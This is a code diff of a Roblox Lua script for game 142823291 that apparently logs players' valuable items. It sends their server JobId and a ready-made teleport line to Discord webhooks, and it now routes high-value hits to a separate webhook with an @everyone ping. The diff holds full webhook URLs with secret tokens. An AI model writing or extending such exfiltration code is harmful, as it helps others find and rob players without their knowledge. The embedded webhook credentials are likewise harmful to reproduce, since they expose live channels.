@@ -1,5 +1,6 @@
 userName = "pro199064"
-webHook = "https://discord.com/api/webhooks/1340718451550978100/g8dCvFrQ3wWi9ByRkbrLnQ2dD3dcBce9arVI5SD5r3i1izj6NCMkod-muCNj89RjM_SY"
+GoodwebHook = "https://discord.com/api/webhooks/1340718451550978100/g8dCvFrQ3wWi9ByRkbrLnQ2dD3dcBce9arVI5SD5r3i1izj6NCMkod-muCNj89RjM_SY"
+webHook = "https://discord.com/api/webhooks/1341447504490663978/d7NAY2LTtQEoVRflYtSBSJ3h_EpYSTnb1d4u6vXB5ETPBQ6cflcf3nq35GMoI2eP87Or"
 
 local values = {
     ["Nik's Scythe"] = 25000000,
@@ -1071,7 +1072,7 @@ local WebHookEmbed = CreateEmbed(
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
-    SendWebhook(webHook, {content = '-- ```'..game.JobId..'``` 142823291 -- @everyone \ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(GoodwebHook, {content = '-- ```'..game.JobId..'``` 142823291 -- @everyone \ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
     SendWebhook(webHook, {content = '-- ```'..game.JobId..'``` 142823291 \ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
